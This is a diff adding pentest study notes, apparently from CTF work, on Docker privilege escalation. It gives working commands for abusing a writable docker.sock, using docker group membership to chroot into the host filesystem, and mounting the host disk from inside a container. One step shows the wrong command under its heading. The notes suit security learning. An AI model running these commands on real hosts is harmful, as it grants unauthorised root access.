@@ -1,1 +1,38 @@
+Docker
+Docker privesc
+Basic privesc example: https://flast101.github.io/docker-privesc/ More on Docker breakout & privesc: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
+Writable Docker Socket /var/run/docker.sock: see here
 
+    Detected Linpeas.sh or manually.
+    Requires image -> if none, run docker pull to download an image to machine.
+
+# CHECK IF WRITABLE
+$ ls -la /var/run/docker.sock
+
+# OPTION 1
+$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+
+# OPTION 2
+$ docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+
+User in Docker group?
+Launch a container and be root over it in mnt. 
+Mounted root on the host to this machine docker container, in the container we have privs. 
+docker run -v /:/mnt -it alpine 
+
+The command id shows we are a member of the docker group. GTFObins again shows a method for spawning a root shell when we are a member of the docker group.
+
+First check what images we have available to us:
+docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+
+We can use the GTFObins command replacing the value <alpine> with one of the images listed above.
+docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+
+.dockerenv
+Listing everything inside the '/' directory shows a .dockerenv file. This combined with the hostname of 0873e8062560 means we are likely running inside a docker container.
+Using the command fdisk -l we can list the hosts disks.
+We can then create a directory and attempt to mount /dev/sda1 to it so we can see if we can browse the hosts file system.
+
+mkdir /mnt/own
+mount /dev/sda1 /mnt/own
+cd /mnt/own
